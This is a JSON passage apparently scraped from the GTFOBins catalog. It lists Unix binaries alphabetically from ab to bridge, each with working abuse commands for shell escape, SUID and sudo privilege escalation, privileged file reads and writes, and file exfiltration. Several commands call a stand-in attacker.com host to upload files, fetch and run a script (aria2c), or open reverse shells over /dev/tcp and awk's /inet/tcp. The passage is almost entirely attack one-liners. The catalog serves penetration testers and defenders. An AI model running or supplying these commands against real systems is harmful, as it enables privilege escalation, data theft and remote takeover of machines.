[
  {
    "id": 0,
    "bin": "ab",
    "url": "/gtfobins/ab/",
    "funcs": [
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nUpload local file via HTTP POST request.\nURL=http://attacker.com/\nLFILE=file_to_send\nab -p $LFILE $URL\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via HTTP GET request. The response is returned as part of the verbose output of the program with some limitations on the length.\nURL=http://attacker.com/file_to_download\nab -v2 $URL\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nUpload local file via HTTP POST request.\nsudo install -m =xs $(which ab) .\n\nURL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nUpload local file via HTTP POST request.\nURL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL"
      }
    ]
  },
  {
    "id": 1,
    "bin": "agetty",
    "url": "/gtfobins/agetty/",
    "funcs": [
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which agetty) .\n\n./agetty -o -p -l /bin/sh -a root tty"
      }
    ]
  },
  {
    "id": 2,
    "bin": "alpine",
    "url": "/gtfobins/alpine/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nalpine -F \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which alpine) .\n\nLFILE=file_to_read\n./alpine -F \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo alpine -F \"$LFILE\""
      }
    ]
  },
  {
    "id": 3,
    "bin": "ansible-playbook",
    "url": "/gtfobins/ansible-playbook/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nansible-playbook $TF\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nsudo ansible-playbook $TF"
      }
    ]
  },
  {
    "id": 4,
    "bin": "apt-get",
    "url": "/gtfobins/apt-get/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nThis invokes the default pager, which is likely to be less, other functions may apply.\napt-get changelog apt\n!/bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThis invokes the default pager, which is likely to be less, other functions may apply.\nsudo apt-get changelog apt\n!/bin/sh\n\n\nFor this to work the target package (e.g., sl) must not be installed.\nTF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n\n\nWhen the shell exits the update command is actually executed.\nsudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
      }
    ]
  },
  {
    "id": 5,
    "bin": "apt",
    "url": "/gtfobins/apt/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nThis invokes the default pager, which is likely to be less, other functions may apply.\napt changelog apt\n!/bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThis invokes the default pager, which is likely to be less, other functions may apply.\nsudo apt changelog apt\n!/bin/sh\n\n\nFor this to work the target package (e.g., sl) must not be installed.\nTF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n\n\nWhen the shell exits the update command is actually executed.\nsudo apt update -o APT::Update::Pre-Invoke::=/bin/sh"
      }
    ]
  },
  {
    "id": 6,
    "bin": "ar",
    "url": "/gtfobins/ar/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nTF=$(mktemp -u)\nLFILE=file_to_read\nar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which ar) .\n\nTF=$(mktemp -u)\nLFILE=file_to_read\n./ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r \"$TF\" \"$LFILE\"\ncat \"$TF\""
      }
    ]
  },
  {
    "id": 7,
    "bin": "aria2c",
    "url": "/gtfobins/aria2c/",
    "funcs": [
      {
        "func": "Command",
        "man": "It can be used to break out from restricted environments by running non-interactive system commands.\n\n\nCOMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\naria2c --on-download-error=$TF http://x\n\n\nThe remote file aaaaaaaaaaaaaaaa (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. --allow-overwrite is needed if this is executed multiple times with the same GID.\naria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nCOMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which aria2c) .\n\nCOMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x"
      }
    ]
  },
  {
    "id": 8,
    "bin": "arj",
    "url": "/gtfobins/arj/",
    "funcs": [
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nThe archive can also be prepared offline then uploaded.\nTF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\narj e \"$TF/a\" $LDIR\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe file appears amid some other textual information. The archive can also be downloaded then extracted offline.\nTF=$(mktemp -u)\nLFILE=file_to_read\narj a \"$TF\" \"$LFILE\"\narj p \"$TF\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThe archive can also be prepared offline then uploaded.\nsudo install -m =xs $(which arj) .\n\nTF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\n./arj e \"$TF/a\" $LDIR\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThe archive can also be prepared offline then uploaded.\nTF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\nsudo arj e \"$TF/a\" $LDIR"
      }
    ]
  },
  {
    "id": 9,
    "bin": "arp",
    "url": "/gtfobins/arp/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\narp -v -f \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which arp) .\n\nLFILE=file_to_read\n./arp -v -f \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo arp -v -f \"$LFILE\""
      }
    ]
  },
  {
    "id": 10,
    "bin": "as",
    "url": "/gtfobins/as/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nas @$LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which as) .\n\nLFILE=file_to_read\n./as @$LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo as @$LFILE"
      }
    ]
  },
  {
    "id": 11,
    "bin": "ascii-xfr",
    "url": "/gtfobins/ascii-xfr/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nascii-xfr -ns \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which ascii-xfr) .\n\nLFILE=file_to_read\n./ascii-xfr -ns \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo ascii-xfr -ns \"$LFILE\""
      }
    ]
  },
  {
    "id": 12,
    "bin": "ascii85",
    "url": "/gtfobins/ascii85/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nascii85 \"$LFILE\" | ascii85 --decode\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo ascii85 \"$LFILE\" | ascii85 --decode"
      }
    ]
  },
  {
    "id": 13,
    "bin": "ash",
    "url": "/gtfobins/ash/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nash\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nexport LFILE=file_to_write\nash -c 'echo DATA > $LFILE'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which ash) .\n\n./ash\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo ash"
      }
    ]
  },
  {
    "id": 14,
    "bin": "aspell",
    "url": "/gtfobins/aspell/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\naspell -c \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which aspell) .\n\nLFILE=file_to_read\n./aspell -c \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo aspell -c \"$LFILE\""
      }
    ]
  },
  {
    "id": 15,
    "bin": "at",
    "url": "/gtfobins/at/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\necho \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | at now; tail -f /dev/null\n\n"
      },
      {
        "func": "Command",
        "man": "It can be used to break out from restricted environments by running non-interactive system commands.\n\n\nThe invocation will be blind, but it is possible to redirect the output to a file in a readable location.\nCOMMAND=id\necho \"$COMMAND\" | at now\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\necho \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null"
      }
    ]
  },
  {
    "id": 16,
    "bin": "atobm",
    "url": "/gtfobins/atobm/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\natobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which atobm) .\n\nLFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'"
      }
    ]
  },
  {
    "id": 17,
    "bin": "awk",
    "url": "/gtfobins/awk/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nawk 'BEGIN {system(\"/bin/sh\")}'\n\n"
      },
      {
        "func": "Non-interactive reverse shell",
        "man": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell.\nRHOST=attacker.com\nRPORT=12345\nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n\n"
      },
      {
        "func": "Non-interactive bind shell",
        "man": "It can bind a non-interactive shell to a local port to allow remote network access.\n\n\nRun nc target.com 12345 on the attacker box to connect to the shell.\nLPORT=12345\nawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_write\nawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nawk '//' \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which awk) .\n\nLFILE=file_to_read\n./awk '//' \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo awk 'BEGIN {system(\"/bin/sh\")}'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which awk) .\n\n./awk 'BEGIN {system(\"/bin/sh\")}'"
      }
    ]
  },
  {
    "id": 18,
    "bin": "base32",
    "url": "/gtfobins/base32/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which base32) .\n\nLFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode"
      }
    ]
  },
  {
    "id": 19,
    "bin": "base58",
    "url": "/gtfobins/base58/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nbase58 \"$LFILE\" | base58 --decode\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo base58 \"$LFILE\" | base58 --decode"
      }
    ]
  },
  {
    "id": 20,
    "bin": "base64",
    "url": "/gtfobins/base64/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nbase64 \"$LFILE\" | base64 --decode\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which base64) .\n\nLFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode"
      }
    ]
  },
  {
    "id": 21,
    "bin": "basenc",
    "url": "/gtfobins/basenc/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which basenc) .\n\nLFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64"
      }
    ]
  },
  {
    "id": 22,
    "bin": "basez",
    "url": "/gtfobins/basez/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nbasez \"$LFILE\" | basez --decode\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which basez) .\n\nLFILE=file_to_read\n./basez \"$LFILE\" | basez --decode\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo basez \"$LFILE\" | basez --decode"
      }
    ]
  },
  {
    "id": 23,
    "bin": "bash",
    "url": "/gtfobins/bash/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nbash\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\nbash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.\nexport RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(<$LFILE)\" > /dev/tcp/$RHOST/$RPORT'\n\n\nSend local file using a TCP connection. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file.\nexport RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via HTTP GET request.\nexport RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'\n\n\nFetch remote file using a TCP connection. Run nc -l -p 12345 < \"file_to_send\" on the attacker box to send the file.\nexport RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nexport LFILE=file_to_write\nbash -c 'echo DATA > $LFILE'\n\n\nThis adds timestamps to the output file.\nLFILE=file_to_write\nHISTIGNORE='history *'\nhistory -c\nDATA\nhistory -w $LFILE\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nIt trims trailing newlines and it\u2019s not binary-safe.\nexport LFILE=file_to_read\nbash -c 'echo \"$(<$LFILE)\"'\n\n\nThe read file content is surrounded by the current history content.\nLFILE=file_to_read\nHISTTIMEFORMAT=$'\\r\\e[K'\nhistory -r $LFILE\nhistory\n\n"
      },
      {
        "func": "Library load",
        "man": "It loads shared libraries that may be used to run code in the binary execution context.\n\n\nbash -c 'enable -f ./lib.so x'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which bash) .\n\n./bash -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo bash"
      }
    ]
  },
  {
    "id": 24,
    "bin": "bpftrace",
    "url": "/gtfobins/bpftrace/",
    "funcs": [
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'\n\n\nTF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF\n\n\nsudo bpftrace -c /bin/sh -e 'END {exit()}'"
      }
    ]
  },
  {
    "id": 25,
    "bin": "bridge",
    "url": "/gtfobins/bridge/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nbridge -b \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which bridge) .\n\nLFILE=file_to_read\n./bridge -b \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
